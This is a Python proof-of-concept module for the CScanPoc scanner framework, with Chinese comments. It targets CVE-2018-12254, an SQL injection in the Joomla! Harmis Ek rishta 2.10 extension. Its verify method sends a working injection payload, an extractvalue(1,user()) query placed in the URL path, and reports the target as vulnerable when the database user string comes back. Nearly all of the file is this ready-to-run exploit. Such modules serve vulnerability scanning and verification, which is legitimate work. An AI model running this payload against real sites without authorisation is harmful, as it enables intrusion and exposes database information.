# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0061'  # 平台漏洞编号
    name = 'Joomla! Harmis Ek rishta SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-06-14'  # 漏洞公布时间
    desc = '''
         Joomla! Harmis Ek rishta 2.10版本中的router.php文件存在SQL注入漏洞。远程攻击者可通过向home/requested_user/Sent%20interest/ URI发送PATH_INFO利用该漏洞注入SQL命令。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-11465'
    cnvd_id = 'CNVD-2018-11465'  # cnvd漏洞编号
    cve_id = 'CVE-2018-12254 '  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla! Harmis Ek rishta 2.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f7c248a8-ac0f-49ab-bf26-2f03c141c1af'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,user())%20%23"
            vul_url = arg + payload

            response = requests.get(vul_url)
            self.output.info('生成SQL注入测试语句成功')
            if response.status_code == 200 and '@localhost' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取的漏洞url地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=vul_url))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
